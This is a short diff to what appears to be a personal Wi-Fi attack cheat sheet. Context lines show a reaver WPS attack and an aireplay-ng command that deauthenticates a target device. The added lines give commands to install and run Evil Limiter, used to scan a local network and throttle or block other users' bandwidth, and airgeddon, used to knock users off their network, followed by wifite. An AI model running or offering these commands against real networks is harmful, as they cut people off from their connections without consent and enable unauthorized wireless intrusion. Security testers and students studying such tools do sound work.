@@ -115,6 +115,28 @@ reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v
 [Use the aireplay to deauth users] 
 aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
 
+[EVIL LIMITER -- DEAUTH AND LIMIIT BANDWIDHT] #
+git clone https://github.com/bitbrute/evillimiter.git
+cd evillimiter
+sudo python3 setup.py install
+sudo evillimiter
+scan
+limit 1,2,3,4,5,6 200kbit ## LIMIT OR BLOCK NETWORK USERS 
+block 3
+hosts
+free all
+
+sudo wireshark ## to watch network traffic 
+#####################################################
+
+
+################################################
+
+[AIRGEDDON] --> DEAUTH USERS WHEN NOT ON ROUTER 
+git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+sudo bash airgeddon.sh
+################################################
 
 sudo wifite -all
 
